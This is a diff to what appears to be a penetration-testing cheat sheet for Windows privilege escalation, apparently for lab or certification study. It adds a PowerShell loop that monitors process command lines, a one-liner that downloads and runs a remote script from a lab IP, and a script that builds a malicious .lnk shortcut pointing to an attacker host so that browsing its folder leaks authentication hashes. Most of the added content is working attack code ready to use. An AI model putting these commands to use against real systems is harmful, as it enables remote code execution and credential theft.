@@ -175,3 +175,38 @@ Text
 | `guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1` |Mount VHD/VHDX on Linux|
 | `sudo python2.7 windows-exploit-suggester.py  --update` |Update Windows Exploit Suggester database|
 | `python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt` |Running Windows Exploit Suggester|
+
+## Process Command Lines
+
+### Monitoring for Process Command Lines
+
+```
+while($true)
+{
+
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+}
+```
+
+### Running Monitor Script on Target Host
+
+```
+IEX (iwr 'http://10.10.10.205/procmon.ps1') 
+```
+
+### Generating a Malicious .lnk File
+
+```
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
